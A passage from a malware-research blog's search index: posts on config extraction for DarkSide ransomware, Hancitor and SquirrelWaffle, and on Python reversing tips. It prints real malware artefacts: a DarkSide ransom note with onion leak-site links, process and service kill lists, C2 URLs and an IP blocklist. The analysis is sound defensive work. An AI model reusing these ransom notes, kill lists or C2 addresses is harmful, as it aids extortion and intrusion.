gcHJlbG9hZGVkIGFuZCB3aWxsIGJlIGF1dG9tYXRpY2FsbHkgcHVibGlzaGVkIGlmIHlvdSBkbyBub3QgcGF5LiANCiBBZnRlciBwdWJsaWNhdGlvbiwgeW91ciBkYXRhIHdpbGwgYmUgYXZhaWxhYmxlIGZvciBhdCBsZWFzdCA2IG1vbnRocyBvbiBvdXIgdG9yIGNkbiBzZXJ2ZXJzLiANCiAgDQogV2UgYXJlIHJlYWR5OiANCiAtIFRvIHByb3ZpZGUgeW91IHRoZSBldmlkZW5jZSBvZiBzdG9sZW4gZGF0YSANCiAtIFRvIGRlbGV0ZSBhbGwgdGhlIHN0b2xlbiBkYXRhLiANCiAgDQogIA0KIFdoYXQgZ3VhcmFudGVlcz8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBXZSB2YWx1ZSBvdXIgcmVwdXRhdGlvbi4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcywgbm9ib2R5IHdpbGwgcGF5IHVzLiBUaGlzIGlzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLiANCiBBbGwgb3VyIGRlY3J5cHRpb24gc29mdHdhcmUgaXMgcGVyZmVjdGx5IHRlc3RlZCBhbmQgd2lsbCBkZWNyeXB0IHlvdXIgZGF0YS4gV2Ugd2lsbCBhbHNvIHByb3ZpZGUgc3VwcG9ydCBpbiBjYXNlIG9mIHByb2JsZW1zLiANCiBXZSBndWFyYW50ZWUgdG8gZGVjcnlwdCBvbmUgZmlsZSBmb3IgZnJlZS4gR28gdG8gdGhlIHNpdGUgYW5kIGNvbnRhY3QgdXMuIA0KICANCiBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyAgDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBVc2luZyBhIFRPUiBicm93c2VyOiANCiAxKSBEb3dubG9hZCBhbmQgaW5zdGFsbCBUT1IgYnJvd3NlciBmcm9tIHRoaXMgc2l0ZTogaHR0cHM6Ly90b3Jwcm9qZWN0Lm9yZy8gDQogMikgT3BlbiBvdXIgd2Vic2l0ZTogaHR0cDovL2RhcmsyNHp6MzZ4bTR5MnBod2U3eXZua2tra2h4aW9uaGZyd3A2N2F3cGIzcjNiZGNuZWl2b3FkLm9uaW9uL1c1N01SSTlDN1laSlVaRUFCQkJZUlFMU1VURzIySlo5TUFIMFdUMUlTSEM0MDVLUDdaMlVXWTNBSTNKNjhETk0gDQogIA0KIFdoZW4geW91IG9wZW4gb3VyIHdlYnNpdGUsIHB1dCB0aGUgZm9sbG93aW5nIGRhdGEgaW4gdGhlIGlucHV0IGZvcm06IA0KIEtleTogDQogIA0KIHVnOGxncFgzV3JGemxFSjZIQldsd0puZjdqZW1oZm5seEJ3OXBvcmoxdXVZRlRnS2J4SlFKTFlpdGVRUzdEd2dabjdkSDBmczdxUFBXbVo2aW5QdjVHVG1TSlpOQWpHTFZJamQ0U29peVRkR3lvcGhmMHpQQnh4NnVFQU9KeE0wV29vNFpHZUtWb1VESHRac3FaTm5oTUY3YVBoNTRWbktwSUpYaVpEYlpadzRQMDZ4VHV3MVVNZWlURTd3ZGc3SFdaTWVwQVZUekVJMlcwNFJia1BGUUhmVWdFRGNzbER4YnI4M0J2b3BZVFlHS0ZSbXROVU1IOE9zT1pRck90djUweFdEYU9mYnF4YnpmSE1KbTMwUUdhR3BneWxKSFFac3NjejNYQm53SWR2bHdCSjlLTjREVmdGZ3ppUmR2d0pyZkNQNllOMUNZVE9RZ3cxcnpxbUlVNEcxeEdZdjdyRTNqaUJZMXM0RDNZMjZTYnBwVGNlQVZNdTFtS3g1Q0ZJRTNFYnRjQXNOdEVxTEhEYlBuTUN2VTZBcHdwMTdUWEdvYjh4WEpwRURCWmhJemRUYUN1eWJjcHJ3Y0ZOVE96Y2NqYklIODFXMzlNcmNKaTltTk8za0hSZTVmeG1JRkt2Yzl2OGFRRGloR3lDNjVEdGRhYnlCamlkWEkxTnlOT05UNFBUeXJ4WXFnZmZQc05ERnV6ejJ5TXJYaVRBd3RBUVBxbnk1QkJKUXNmVmhwTFhUdG5MdldnMSANCiAgDQogISEhIERBTkdFUiAhISEgDQogRE8gTk9UIE1PRElGWSBvciB0cnkgdG8gUkVDT1ZFUiBhbnkgZmlsZXMgeW91cnNlbGYuIFdlIFdJTEwgTk9UIGJlIGFibGUgdG8gUkVTVE9SRSB0aGVtLiAgDQogISEhIERBTkdFUiAhISE=&#34; . Parsing The Config . The first 128 bytes of the config are the RSA exponent followed by the 128 bytes RSA modulus. . After the modulus is a 32 buffer containing a null terminated ascii string representing the affiliate ID followed by some random data. . Next is a 22 bytes buffer containing a series of binary configuration flags. . Next is a DWORD indicating where the start of the next configuration value. . The following config values are base64 encoded and seperated by null bytes. . import base64 ptr = 0 rsa_exponent = ptxt_data[ptr:128] ptr += 128 rsa_mod = ptxt_data[ptr:ptr+128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] affiliate_id = affiliate_id_data.split(b&#39; x00&#39;)[0] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 22 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c).split(b&#39; x00 x00&#39;)) . Print Config Values . print(&quot;Affiliate ID: %s n&quot; % affiliate_id) for c in config_values: print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c])) . Affiliate ID: b&#39;0607b8382472634&#39; b&#39;$recycle.bin | config.msi | $windows.~bt | $windows.~ws | windows | appdata | application data | boot | google | mozilla | program files | program files (x86) | programdata | system volume information | tor browser | windows.old | intel | msocache | perflogs | x64dbg | public | all users | default | | &#39; b&#39;autorun.inf | boot.ini | bootfont.bin | bootsect.bak | desktop.ini | iconcache.db | ntldr | ntuser.dat | ntuser.dat.log | ntuser.ini | thumbs.db | | &#39; b&#39;386 | adv | ani | bat | bin | cab | cmd | com | cpl | cur | deskthemepack | diagcab | diagcfg | diagpkg | dll | drv | exe | hlp | icl | icns | ico | ics | idx | ldf | lnk | mod | mpa | msc | msp | msstyles | msu | nls | nomedia | ocx | prf | ps1 | rom | rtp | scr | shs | spl | sys | theme | themepack | wpx | lock | key | hta | msi | pdb | | &#39; b&#39;backup | | &#39; b&#39;sql | sqlite | | &#39; b&#39;vmcompute.exe | vmms.exe | vmwp.exe | svchost.exe | TeamViewer.exe | explorer.exe | | &#39; b&#39;sql | oracle | ocssd | dbsnmp | synctime | agntsvc | isqlplussvc | xfssvccon | mydesktopservice | ocautoupds | encsvc | firefox | tbirdconfig | mydesktopqos | ocomm | dbeng50 | sqbcoreservice | excel | infopath | msaccess | mspub | onenote | outlook | powerpnt | steam | thebat | thunderbird | visio | winword | wordpad | notepad | | &#39; b&#39;vss | sql | svc$ | memtas | mepocs | sophos | veeam | backup | GxVss | GxBlr | GxFWD | GxCVD | GxCIMgr | | &#39; b&#39;baroquetees.com | rumahsia.com | | &#39; b&#39;Welcome to DarkSide! r n r n All Your Files Are Encrypted! r n r n Find %s And Follow Instructions! | | &#39; b&#39;-- [ Welcome to DarkSide ] -&gt; r n r n What happend? r n - r n Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. r n But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network. r n Follow our instructions below and you will recover all your data. r n r n Data leak r n - r n First of all we have downloaded more then 500GB data from your network. r n r n Included: r n -Accounting data r n -Finance data r n -HR r n -Employees confidential data(photos, benefits, taxes, etc) r n -Marketing r n -Budgets r n -Taxes(sales tax compliance, property, income and franchise taxes, etc) r n -Payrolls r n -Banking data r n -Arbitration r n -Scans r n -Insurance r n -Reconciliations r n -Reports(monthly bank inventory, monthly financial, claims reports, etc) r n -Audits(DHG, insurance audits, etc) r n -B2B clients config data r n -Confidentiality 2020 r n -2020, 2021 Business plans r n -2019, 2020, 2021 years Closing (full dumps) r n -and a lot of other sensitive data r n r n Your personal leak page: http://darksidc3iux462n6yunevoag52ntvwp6wulaz3zirkmh4cnz6hhj7id.onion/162/thedixiegroup/LCfyHRcwffrYTblpZvoPO3XDbrYPcNu0wVAsH5p49LSjBfzTmtdXT48azXFlMu7q r n On the page you will find examples of files that have been downloaded. r n The data is preloaded and will be automatically published if you do not pay. r n After publication, your data will be available for at least 6 months on our tor cdn servers. r n r n We are ready: r n - To provide you the evidence of stolen data r n - To delete all the stolen data. r n r n r n What guarantees? r n - r n We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests. r n All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems. r n We guarantee to decrypt one file for free. Go to the site and contact us. r n r n How to get access on website? r n - r n Using a TOR browser: r n 1) Download and install TOR browser from this site: https://torproject.org/ r n 2) Open our website: http://dark24zz36xm4y2phwe7yvnkkkkhxionhfrwp67awpb3r3bdcneivoqd.onion/W57MRI9C7YZJUZEABBBYRQLSUTG22JZ9MAH0WT1ISHC405KP7Z2UWY3AI3J68DNM r n r n When you open our website, put the following data in the input form: r n Key: r n r n ug8lgpX3WrFzlEJ6HBWlwJnf7jemhfnlxBw9porj1uuYFTgKbxJQJLYiteQS7DwgZn7dH0fs7qPPWmZ6inPv5GTmSJZNAjGLVIjd4SoiyTdGyophf0zPBxx6uEAOJxM0Woo4ZGeKVoUDHtZsqZNnhMF7aPh54VnKpIJXiZDbZZw4P06xTuw1UMeiTE7wdg7HWZMepAVTzEI2W04RbkPFQHfUgEDcslDxbr83BvopYTYGKFRmtNUMH8OsOZQrOtv50xWDaOfbqxbzfHMJm30QGaGpgylJHQZsscz3XBnwIdvlwBJ9KN4DVgFgziRdvwJrfCP6YN1CYTOQgw1rzqmIU4G1xGYv7rE3jiBY1s4D3Y26SbppTceAVMu1mKx5CFIE3EbtcAsNtEqLHDbPnMCvU6Apwp17TXGob8xXJpEDBZhIzdTaCuybcprwcFNTOzccjbIH81W39MrcJi9mNO3kHRe5fxmIFKvc9v8aQDihGyC65DtdabyBjidXI1NyNONT4PTyrxYqgffPsNDFuzz2yMrXiTAwtAQPqny5BBJQsfVhpLXTtnLvWg1 r n r n !!! DANGER !!! r n DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. r n !!! DANGER !!!&#39; .",
            "url": "https://research.openanalysis.net/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "relUrl": "/darkside/ransomware/malware/config/2021/10/08/darkside_ransomware.html",
            "date": " ‚Ä¢ Oct 8, 2021"
        }
        
    
  
    
        ,"post74": {
            "title": "Hancitor",
            "content": "Overview . Notes from our live stream where we reverse engineered the Hancitor DLL and built a static config extractor for it. . Malware Sample . Malware Traffic Analysis Sample 1 | Unpacked Sample (malshare) | . References . DFIR Report Hancitor . Setup Imports . We are going to need some libraries to get our config extractor working. . pefile - Parse data into a PE format. Read the docs. | re - Use a regular expression to locate our config data. Read the docs. | struct - Convert binary data into numeric values. Read the docs. | hashlib - Generate a SHA1 hash. Read the docs. | . import pefile import re import struct import hashlib . Load The Malware . We need to read in the malware binary, remember to replace the path with a path the file on your own host. We also want to parse the data as a PE file so we can easily access the PE structure in our code. . file_path = r&#39;/tmp/hancitor.bin&#39; data = open(file_path,&#39;rb&#39;).read() pe = pefile.PE(data=data) . Use A Regular Expression to Locate The Decryption Code . We can use a regulare expression to find the code that is used to setup the arguments for the config decryption function. The key is to assume that the config length will say the same 0x2000 so we can use this as a marker in the code. . . The (.) in our regular expression are a wildcard -- match any bytes -- in a capture group. The capture group can then be used to extract the data that was matched by the wildcard. In this case we use a capture group to pull the size of the key and the address of the key. . key = rb&#39; x6a(.) x68(....) x68 x00 x20 x00 x00&#39; m = re.search(key, data) if m != None: print(&quot;key length: %r&quot; % m.group(1)) print(&quot;key address: %r&quot; % m.group(2)) . key length: b&#39; x08&#39; key address: b&#39; x10PV x00&#39; . Convert The Extracted Key Information . The key information extracted in our capture groups is binary so it must be converted into a data type to be used in our scipt. WE can use the struct library to do this. The &#39;b&#39; signifies that we are converting a byte and the &#39;&lt;I&#39; signifies that we are converting an unsigned integer (DWORD) stored in little-endian format. . struct.unpack(&#39;b&#39;, m.group(1))[0] . 8 . hex(struct.unpack(&#39;&lt;I&#39;, m.group(2))[0]) . &#39;0x565010&#39; . Use The Key Information To Extract The Key Data . Now that we have the key length and key address we can use this information to extract the key data, and the config data (which directly follows the key in the binary). The key address needs to be converted into a file offset so we can locate that data in our file. . To convert from an address in the PE file to a file offset we must first convert the address into a relative virtual address (RVA) then we can use the build in pefile function get_offset_from_rva to convert the RVA to a file offset. . Once we have the file offset of the key data we can extract the key and the config from our file. . key_len = struct.unpack(&#39;b&#39;, m.group(1))[0] key_address = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] key_rva = key_address - pe.OPTIONAL_HEADER.ImageBase key_offset = pe.get_offset_from_rva(key_rva) key_data = data[key_offset:key_offset+key_len] config_data = data[key_offset+key_len:key_offset+key_len+0x2000] . Hash The Key Data To Create The Key . The config decryption key is the first 5 bytes of a sha1 hash of the key data. We can use the hashlib library to create the key hash. . m = hashlib.sha1() m.update(key_data) key = m.digest()[:5] . RC4 Decryption . The actual decryption algorithm is RC4. If you want to learn more about RC4 you can check out our RC4 Tutorial. . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Parsing The Config . Once we have the config decrypted we can parse out the BUILD and the C2 list. . config = rc4crypt(config_data, key) build_id = config.split(b&#39; x00&#39;)[0] c2_string = b&#39;&#39; for s in config.split(b&#39; x00&#39;)[1:]: if s != b&#39;&#39;: c2_string = s break c2_list = c2_string.split(b&#39;|&#39;) print(&quot;BUILD: %s&quot; % build_id) for c2 in c2_list: if c2 != b&#39;&#39;: print(&quot;C2: %s&quot; % c2) . BUILD: b&#39;0109_iqwnm&#39; C2: b&#39;http://asinvotheir.com/8/forum.php&#39; C2: b&#39;http://ditrismale.ru/8/forum.php&#39; C2: b&#39;http://clatrommon.ru/8/forum.php&#39; .",
            "url": "https://research.openanalysis.net/hancitor/malware/config/2021/10/04/hancitor.html",
            "relUrl": "/hancitor/malware/config/2021/10/04/hancitor.html",
            "date": " ‚Ä¢ Oct 4, 2021"
        }
        
    
  
    
        ,"post75": {
            "title": "SquirrelWaffel Config Extraction",
            "content": "Overview . Notes from our live stream where we reverse engineered the squirrelwaffle loader and built a static config extractor for it. . References . Malware Traffic Analysis Sample 1 | Malware Traffic Analysis Sample 2 | Unpacked Sample (malshare) | . Setup . Make sure you have pefile installed pip install pefile and you change the SAMPLE_PATH to the squirrelwaffle sample you have downloaded. . import pefile . SAMPLE_PATH = r&#39;/tmp/squirrel.bin&#39; data = open(SAMPLE_PATH,&#39;rb&#39;).read() . Extract the .rdata section . The .rdata section has the encrypted data and the decryption keys so let&#39;s grab that first. . pe = pefile.PE(data=data) rdata = None for s in pe.sections: if b&#39;.rdata&#39; in s.Name: rdata = s.get_data() len(rdata) . 20480 . Parse .rdata . The encrypted strings in the .rdata section are followed by their key and all data, keys, and strings are seperated by null bytes. We can parse out the data and key by splitting the .rdata on null bytes then looking for the largest blocks of data. These are likely the encrypted blocklist and the encrypted c2 list. . We want to maintain two lists of data blocks, one sorted and one original order. This way we can use the sorted list to get the largest blocks, and the original order list to find the key which is sequentially after the encrypted data. . blocks = rdata.split(b&#39; x00&#39;) blocks = [x for x in blocks if x != b&#39;&#39;] blocks_sorted = sorted(blocks, key=len) . Decryption function . The config decryption is a simple xor so we want to replicate this in python . def decrypt(key, data): out = &#39;&#39; for i in range(len(data)): out += chr(data[i] ^ key[i % len(key)]) return out . Decrypt the blocklist . The largest encrupted block is likely the blocklist so let&#39;s decrypt that first. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-1]: out = decrypt(blocks[i+1], blocks[i]) print(out) . 94.46.179.80 206.189.205.251 88.242.66.45 85.75.110.214 87.104.3.136 207.244.91.171 49.230.88.160 91.149.252.75 91.149.252.88 92.211.109.152 178.0.250.168 88.69.16.230 95.223.77.160 99.234.62.23 2.206.105.223 84.222.8.201 89.183.239.142 5.146.132.101 77.7.60.154 45.41.106.122 45.74.72.13 74.58.152.123 88.87.68.197 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 185.220.100.249 37.71.173.58 93.2.220.100 188.10.191.109 81.36.17.247 70.28.47.118 45.133.172.222 108.41.227.196 37.235.53.46 162.216.47.22 154.3.42.51 45.86.200.60 212.230.181.152 185.192.70.11 37.142.65.69 87.166.51.31 178.198.76.175 128.90.172.136 172.58.227.224 201.77.112.133 64.124.12.162 87.166.51.28 104.244.72.115 109.70.100.23 192.145.127.220 194.186.142.122 185.207.249.217 52.250.42.144 45.86.201.156 195.245.199.125 213.33.190.70 154.61.71.13 154.13.1.22 191.96.185.151 40.94.25.22 40.94.25.39 40.94.25.5 40.94.25.79 40.94.25.69 40.94.25.71 40.94.25.60 40.94.25.64 40.94.25.29 40.94.25.23 40.94.25.89 40.94.26.165 40.94.26.210 40.94.26.208 40.94.26.166 40.94.26.216 40.94.26.173 40.94.26.182 40.94.35.75 40.94.35.97 40.94.35.27 40.94.35.38 40.94.35.46 40.94.35.76 40.94.35.70 40.94.35.80 40.94.35.98 40.94.35.40 45.86.200.23 198.167.212.98 40.94.31.87 40.94.31.85 40.94.31.29 40.94.31.97 40.94.31.88 40.94.31.80 40.94.31.65 198.167.195.112 40.94.31.58 40.94.31.48 40.94.31.64 40.94.31.26 40.94.31.66 40.94.31.90 40.94.31.46 40.94.31.47 212.119.227.184 72.12.194.93 72.12.194.94 72.12.194.92 134.209.213.55 35.198.84.59 89.208.29.2 40.94.30.159 40.94.30.139 40.94.30.152 40.94.30.167 40.94.30.164 40.94.30.166 40.94.30.174 40.94.30.151 154.61.71.53 40.94.30.157 40.94.30.136 40.94.30.149 52.154.162.74 213.33.190.161 83.84.25.214 162.251.62.154 188.241.177.152 92.211.110.221 154.61.71.51 185.183.107.236 72.12.194.90 40.94.25.36 40.94.29.4 40.94.25.50 40.94.29.31 40.94.25.31 40.94.29.41 40.94.31.5 40.94.25.80 40.94.29.82 40.94.31.81 40.94.25.96 40.94.29.59 40.94.31.3 40.94.25.58 40.94.31.61 40.94.31.49 40.94.31.54 40.94.31.62 40.94.31.70 40.94.30.211 40.94.30.148 40.94.30.218 40.94.30.147 40.94.30.129 40.94.31.15 40.94.30.169 40.94.31.36 40.94.30.223 40.94.30.203 95.211.36.179 64.233.172.102 153.246.206.71 198.167.193.35 90.187.12.209 37.49.116.179 52.167.22.240 160.177.96.15 185.123.143.220 167.99.172.253 40.94.36.81 86.107.21.203 24.37.31.38 71.19.154.84 34.142.74.220 192.160.102.170 216.251.130.74 49.44.76.43 109.147.65.157 86.217.130.91 178.174.15.54 86.242.244.97 92.46.70.105 81.201.234.26 78.94.217.60 141.226.236.91 95.26.228.102 89.208.29.3 213.33.190.205 213.33.190.121 5.154.174.45 23.154.177.3 195.65.152.138 93.231.174.227 185.220.101.132 54.36.101.21 72.12.194.91 46.14.116.174 141.19.232.57 185.220.101.149 45.74.46.69 157.230.210.133 82.199.130.36 104.237.193.28 187.46.138.56 195.164.49.162 156.146.49.135 195.164.49.191 79.104.209.54 35.245.134.90 20.52.139.186 189.139.144.151 94.31.102.187 39.43.45.71 107.189.10.143 39.43.123.57 106.75.76.179 194.186.142.131 210.22.129.194 45.130.83.77 154.6.16.175 162.247.73.192 107.189.1.160 185.107.47.215 46.166.139.111 185.56.80.65 185.220.100.245 209.141.59.180 77.247.181.163 185.220.101.137 185.220.100.242 104.244.76.13 185.83.214.69 185.220.100.252 185.112.146.73 185.57.82.28 89.187.171.116 66.220.242.222 39.43.72.17 5.171.90.80 185.152.32.77 23.129.64.157 92.151.9.187 106.75.31.237 122.167.79.251 109.70.100.33 199.249.230.154 64.233.172.108 64.233.172.106 64.233.172.104 77.247.181.165 107.189.12.240 79.142.76.203 193.128.114.34 185.92.26.59 185.65.210.119 70.39.159.79 70.39.159.29 151.48.26.15 151.48.26.15 2.228.159.178 188.174.248.154 188.174.248.154 95.90.198.182 95.90.198.182 193.0.200.36 193.0.200.36 151.127.13.232 89.97.249.158 212.115.152.225 185.217.117.179 199.249.230.164 80.233.134.134 109.74.154.92 65.39.88.250 90.84.192.187 37.70.202.24 85.203.45.30 109.190.93.219 151.8.114.194 176.235.38.106 149.56.99.85 138.128.136.169 213.82.23.224 192.42.123.107 128.90.151.188 162.245.206.249 85.203.45.40 95.211.95.242 185.220.102.251 66.203.112.160 193.128.108.246 193.128.108.242 31.204.150.74 34.141.245.25 122.167.85.191 212.6.86.133 171.25.193.25 149.3.170.147 162.247.74.217 109.70.100.34 89.208.29.5 79.104.209.91 79.104.209.157 194.186.142.205 198.167.217.20 198.167.193.112 204.101.161.31 198.167.219.82 195.74.76.222 70.93.153.224 87.118.110.27 185.247.225.43 193.128.108.250 188.212.135.7 106.75.75.245 86.142.177.106 185.192.69.77 198.167.209.37 59.144.163.235 193.128.108.243 31.204.152.150 211.177.21.222 87.166.49.39 82.127.202.176 58.40.175.6 94.46.179.80 206.189.205.251 178.255.172.194 84.221.205.40 155.138.242.103 178.212.98.156 85.65.32.191 31.167.184.201 88.242.66.45 36.65.102.42 203.213.127.79 85.75.110.214 93.78.214.187 204.152.81.185 183.171.72.218 168.194.101.130 87.104.3.136 92.211.196.33 197.92.140.125 207.244.91.171 49.230.88.160 196.74.16.153 91.149.252.75 91.149.252.88 92.206.15.202 82.21.114.63 92.211.109.152 178.0.250.168 178.203.145.135 85.210.36.4 199.83.207.72 86.132.134.203 88.69.16.230 99.247.129.88 37.201.195.12 87.140.192.0 88.152.185.188 87.156.177.91 99.229.57.160 95.223.77.160 88.130.54.214 99.234.62.23 2.206.105.223 94.134.179.130 84.221.255.199 84.222.8.201 89.183.239.142 87.158.21.26 93.206.148.216 5.146.132.101 77.7.60.154 95.223.75.85 162.254.173.187 50.99.254.163 45.41.106.122 99.237.13.3 45.74.72.13 108.171.64.202 74.58.152.123 216.209.253.121 88.87.68.197 211.107.25.121 109.70.100.25 185.67.82.114 207.102.138.19 204.101.161.14 193.128.108.251 111.7.100.17 111.7.100.16 74.125.210.62 74.125.210.36 104.244.74.57 185.220.101.145 185.220.101.144 185.220.101.18 185.220.100.246 185.220.101.228 185.220.100.243 185.220.101.229 185.220.101.147 185.220.102.250 185.220.100.241 199.195.251.84 213.164.204.94 74.125.213.7 74.125.213.9 177.38.183.13 185.220.100.249 . Decrypt the c2s . The second largest encrupted block is likely the C2 list so let&#39;s decrypt that now. . for i in range(len(blocks)): if blocks[i] == blocks_sorted[-2]: out = decrypt(blocks[i+1], blocks[i]) print(out) . celulasmadreenmexico.com.mx/Wt793Aua|gerencial.institutoacqua.org.br/XynFkhJAxnm|dashboard.adlytic.ai/LlvLoc9O3|bussiness-z.ml/3pdEiqsni|ifiengineers.com/hGVc55g2e|bonusvulkanvegas.srdm.in/U7oOxmI1m|ebrouteindia.com/JEqGe1hNR|test.dirigu.ro/dXf4cS4GPL|cablingpoint.com/LjDG0hkp|perfectdemos.com/T6PQGYCMt|afrizam.360cyberlink.com/f36rjSN5D1|giasuphire.tddvn.com/miFO43YP9b|priyacareers.com/GiTHMPbU|assurant.360cyberlink.com/DGx4k8U9Hil|sig.institutoacqua.org.br/tM7tINg2sCU| . Clean up the c2 list . It looks like the C2 list is seperated by pipes | so let&#39;s turn that into a nice list. . print(out.replace(&#39;|&#39;,&#39; n&#39;)) . celulasmadreenmexico.com.mx/Wt793Aua gerencial.institutoacqua.org.br/XynFkhJAxnm dashboard.adlytic.ai/LlvLoc9O3 bussiness-z.ml/3pdEiqsni ifiengineers.com/hGVc55g2e bonusvulkanvegas.srdm.in/U7oOxmI1m ebrouteindia.com/JEqGe1hNR test.dirigu.ro/dXf4cS4GPL cablingpoint.com/LjDG0hkp perfectdemos.com/T6PQGYCMt afrizam.360cyberlink.com/f36rjSN5D1 giasuphire.tddvn.com/miFO43YP9b priyacareers.com/GiTHMPbU assurant.360cyberlink.com/DGx4k8U9Hil sig.institutoacqua.org.br/tM7tINg2sCU .",
            "url": "https://research.openanalysis.net/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "relUrl": "/squirrelwaffel/malware/config/2021/09/27/squirrelwaffle.html",
            "date": " ‚Ä¢ Sep 27, 2021"
        }
        
    
  
    
        ,"post76": {
            "title": "Reversing Tips With Python3",
            "content": "Overview . Several tips to level up your reverse engineering with Python3. . Tip 1 - Use Juptyper Notebooks and A Git Repo . Remember to steal our .gitignore file to filter out the juptyper junk files. . Tip 2 - Remember Byte Strings Are Not Strings . import binascii string_example = &quot;test&quot; byte_array_example = b&quot;test&quot; # Convert string into bytes print(string_example.encode(&#39;utf-8&#39;)) # Convert byte array into string print(byte_array_example.decode(&#39;utf-8&#39;)) . b&#39;test&#39; test . Example for Tips 3-5 . example_data = b&#39; x02 x00 x00 x00 x00 x04 x00 x00 x00test x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . Example Data Structure . struct strings{ DWORD number_of_strings; string* string; } struct string{ BOOL is_wide_string; DWORD string_length; chr* string; } . Tip 3 - Hex Encoding Binary Data . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) print(&quot;This is hex encoded data: %r&quot; % tohex(example_data)) . This is hex encoded data: b&#39;0200000000040000007465737401040000007400650073007400&#39; . Tip 4 - Use Struct To Convert Between Data and Types . https://docs.python.org/3/library/struct.html . import struct number_of_strings = struct.unpack(&#39;&lt;I&#39;,example_data[:4])[0] print(&quot;Number of strings: %d&quot; % number_of_strings) . Number of strings: 2 . Tip 5 - Use Custom Struct Class To Parse Binary Data . import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; class EXAMPLE_STRING: def __init__(self): self.is_wide_string = False self.string_length = 0 self.string = b&#39;&#39; def from_buffer_copy(self, data): ptr = 0 self.is_wide_string = struct.unpack(&#39;?&#39;, data[ptr:ptr+1])[0] ptr += 1 self.string_length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 if self.is_wide_string: self.string = data[ptr:ptr+(self.string_length*2)].decode(&#39;utf-16le&#39;) ptr += self.string_length*2 else: self.string = data[ptr:ptr+self.string_length].decode(&#39;utf-8&#39;) ptr += self.string_length def pack(self): data = b&#39;&#39; data += struct.pack(&#39;?&#39;, self.is_wide_string) data += struct.pack(&#39;&lt;I&#39;, self.string_length) if self.is_wide_string: data += self.string.encode(&#39;utf-16le&#39;) else: data += self.string.encode(&#39;utf-8&#39;) return data print(&quot;Example string data: %r&quot; % example_string) es = EXAMPLE_STRING() es.from_buffer_copy(example_string) print(&quot;Example is wide: %s&quot; % es.is_wide_string) print(&quot;Example string length: %d&quot; % es.string_length) print(&quot;Example string: %s&quot; % es.string) . Example string data: b&#39; x00 x04 x00 x00 x00test&#39; Example is wide: False Example string length: 4 Example string: test . es.is_wide_string = True print(&quot;Example string data converted to wide: %r&quot; % es.pack()) . Example string data converted to wide: b&#39; x01 x04 x00 x00 x00t x00e x00s x00t x00&#39; . class EXAMPLE_STRINGS: def __init__(self): self.length = 0 self.strings = [] def from_buffer_copy(self, data): ptr = 0 self.length = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] ptr += 4 for i in range(self.length): tmp_string = EXAMPLE_STRING() tmp_string.from_buffer_copy(data[ptr:]) ptr += len(tmp_string.pack()) self.strings.append(tmp_string) def pack(self): data = b&#39;&#39; data += struct.pack(&#39;&lt;I&#39;, self.length) for s in self.strings: data += s.pack() return data es = EXAMPLE_STRINGS() es.from_buffer_copy(example_data) print(&quot;Number of strings: %d&quot; % es.length) print(&quot;First string is wide: %s&quot; % es.strings[0].is_wide_string) print(&quot;First string: %s&quot; % es.strings[0].string) print(&quot;Second string is wide: %s&quot; % es.strings[1].is_wide_string) print(&quot;Second string: %s&quot; % es.strings[1].string) . Number of strings: 2 First string is wide: False First string: test Second string is wide: True Second string: test . Tip 6 - Parse Stream With BytesIO . without position pointer . https://docs.python.org/3/library/io.html#binary-i-o . import io import struct example_string = b&#39; x00 x04 x00 x00 x00test&#39; bstream = io.BytesIO(example_string) # transform example_string in stream (like File) is_wide_string, *_ = struct.unpack(&#39;?&#39;, bstream.read(1)) string_length, *_ = struct.unpack(&#39;&lt;I&#39;, bstream.read(4)) string_length = string_length*2 if is_wide_string else string_length strings = bstream.read(string_length).decode(&#39;utf-16le&#39; if is_wide_string else &#39;utf-8&#39;) print(f&#39;is_wide_string: {is_wide_string}&#39;) print(f&#39;string_length: 